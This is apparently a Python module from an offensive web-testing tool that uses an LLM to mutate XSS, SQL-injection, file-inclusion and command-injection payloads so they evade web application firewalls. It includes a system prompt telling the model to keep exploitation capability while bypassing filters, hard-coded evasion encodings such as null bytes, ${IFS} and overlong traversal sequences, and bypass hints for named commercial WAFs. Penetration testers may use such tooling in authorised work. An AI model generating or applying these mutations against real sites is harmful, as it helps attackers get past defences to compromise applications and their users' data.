"""
AI-Powered Payload Mutator
Generates context-aware, WAF-bypassing payloads using LLM.
"""

import json
from dataclasses import dataclass

from .providers.groq_provider import get_groq_provider
from .providers.ollama_provider import get_ollama_provider


@dataclass
class MutatedPayload:
    """A mutated payload with metadata"""
    payload: str
    technique: str
    description: str
    confidence: float = 0.5


class PayloadMutator:
    """
    AI-powered payload mutation for WAF bypass and filter evasion.

    Uses LLM to generate context-aware payload variations.
    """

    MUTATION_PROMPT = """You are an expert penetration tester specializing in WAF bypass techniques.

Given the original payload and context, generate mutated versions that:
1. Evade common WAF rules
2. Use encoding/obfuscation techniques
3. Exploit parser differentials
4. Maintain exploitation capability

Respond with JSON array:
[
    {
        "payload": "mutated payload here",
        "technique": "technique name",
        "description": "why this might work"
    }
]

Generate 5 unique mutations."""

    # Fallback mutation techniques
    ENCODING_MUTATIONS = {
        "xss": [
            lambda p: p.replace("<", "%3C").replace(">", "%3E"),
            lambda p: p.replace("<", "\\x3c").replace(">", "\\x3e"),
            lambda p: p.replace("script", "scr\x00ipt"),
            lambda p: p.replace("<script>", "<scr\tipt>"),
            lambda p: p.replace("alert", "al\\u0065rt"),
            lambda p: f"<!--{p}-->",
            lambda p: p.replace("<", "\u003c").replace(">", "\u003e"),
        ],
        "sqli": [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("OR", "||").replace("AND", "&&"),
            lambda p: p.replace("SELECT", "SeLeCt"),
            lambda p: p.replace("'", "''"),
            lambda p: p.replace(" ", "%20"),
            lambda p: p.replace("=", " LIKE "),
            lambda p: f"/*!{p}*/",
        ],
        "lfi": [
            lambda p: p.replace("../", "..%2f"),
            lambda p: p.replace("../", "..%252f"),
            lambda p: p.replace("../", "....//"),
            lambda p: p.replace("../", "..%c0%af"),
            lambda p: p.replace("/etc/passwd", "/etc/./passwd"),
        ],
        "cmdi": [
            lambda p: p.replace(";", "%0a"),
            lambda p: p.replace(" ", "${IFS}"),
            lambda p: p.replace("cat", "c'a't"),
            lambda p: p.replace("|", "%7c"),
            lambda p: f"$({p})",
        ],
    }

    def __init__(
        self,
        provider: str = "auto",
        groq_api_key: str = None,
        ollama_host: str = None,
    ):
        self.provider_preference = provider

        # Initialize providers
        self.groq = get_groq_provider(api_key=groq_api_key)
        self.ollama = get_ollama_provider(host=ollama_host)

        self._active_provider = None
        if provider == "groq" and self.groq.is_available():
            self._active_provider = self.groq
        elif provider == "ollama" and self.ollama.is_available():
            self._active_provider = self.ollama
        elif provider == "auto":
            if self.groq.is_available():
                self._active_provider = self.groq
            elif self.ollama.is_available():
                self._active_provider = self.ollama

    def mutate(
        self,
        payload: str,
        vuln_type: str,
        context: str = "",
        waf_info: str = "Unknown",
        count: int = 5,
    ) -> list[MutatedPayload]:
        """
        Generate mutated payloads using AI.

        Args:
            payload: Original payload to mutate
            vuln_type: Vulnerability type (xss, sqli, lfi, cmdi, etc.)
            context: Target context information
            waf_info: Detected WAF information
            count: Number of mutations to generate

        Returns:
            List of mutated payloads
        """
        # Try AI-based mutation first
        if self._active_provider:
            mutations = self._ai_mutate(payload, vuln_type, context, waf_info, count)
            if mutations:
                return mutations

        # Fall back to rule-based mutation
        return self._fallback_mutate(payload, vuln_type, count)

    def _ai_mutate(
        self,
        payload: str,
        vuln_type: str,
        context: str,
        waf_info: str,
        count: int,
    ) -> list[MutatedPayload]:
        """AI-based payload mutation"""
        prompt = f"""Mutate this {vuln_type.upper()} payload to bypass WAF.

Original payload: {payload}
WAF detected: {waf_info}
Context: {context}

Generate {count} unique mutations."""

        result = self._active_provider.generate(
            prompt=prompt,
            system_prompt=self.MUTATION_PROMPT,
            temperature=0.7,  # Higher for more creative mutations
            max_tokens=1500,
            json_mode=True,
        )

        if not result.success:
            return []

        try:
            data = json.loads(result.text)
            if isinstance(data, list):
                mutations = data
            elif isinstance(data, dict) and "mutations" in data:
                mutations = data["mutations"]
            else:
                return []

            return [
                MutatedPayload(
                    payload=m.get("payload", ""),
                    technique=m.get("technique", "unknown"),
                    description=m.get("description", ""),
                    confidence=0.7,
                )
                for m in mutations
                if m.get("payload")
            ]
        except (json.JSONDecodeError, KeyError):
            return []

    def _fallback_mutate(
        self,
        payload: str,
        vuln_type: str,
        count: int,
    ) -> list[MutatedPayload]:
        """Rule-based fallback mutation"""
        mutations = []
        vuln_type_lower = vuln_type.lower()

        # Get mutation functions for this vuln type
        mutators = self.ENCODING_MUTATIONS.get(vuln_type_lower, [])

        # Also include generic mutations
        generic = [
            lambda p: p.lower(),
            lambda p: p.upper(),
            lambda p: p.replace(" ", "+"),
            lambda p: p + "\x00",
        ]

        all_mutators = mutators + generic

        for i, mutator in enumerate(all_mutators[:count]):
            try:
                mutated = mutator(payload)
                mutations.append(MutatedPayload(
                    payload=mutated,
                    technique=f"encoding_{i+1}",
                    description="Rule-based mutation",
                    confidence=0.4,
                ))
            except Exception:
                pass

        return mutations

    def mutate_for_waf(
        self,
        payload: str,
        vuln_type: str,
        waf_name: str,
    ) -> list[MutatedPayload]:
        """
        Generate mutations specifically for a known WAF.

        Args:
            payload: Original payload
            vuln_type: Vulnerability type
            waf_name: Detected WAF name (e.g., Cloudflare, ModSecurity)

        Returns:
            List of WAF-specific mutations
        """
        waf_bypass_info = {
            "cloudflare": "Use Unicode normalization, chunked encoding, or case variations",
            "modsecurity": "Try SQL comment injection, HPP, or parameter pollution",
            "aws_waf": "Use JSON-based payloads or encoding chains",
            "akamai": "Try double URL encoding or Unicode escapes",
            "imperva": "Use unusual whitespace or comment injection",
        }

        context = waf_bypass_info.get(
            waf_name.lower().replace(" ", "_"),
            "Unknown WAF - try various encoding techniques"
        )

        return self.mutate(
            payload=payload,
            vuln_type=vuln_type,
            context=f"Targeting {waf_name}",
            waf_info=context,
            count=5,
        )


# Singleton
_mutator: PayloadMutator | None = None


def get_payload_mutator(**kwargs) -> PayloadMutator:
    """Get singleton payload mutator"""
    global _mutator
    if _mutator is None:
        _mutator = PayloadMutator(**kwargs)
    return _mutator
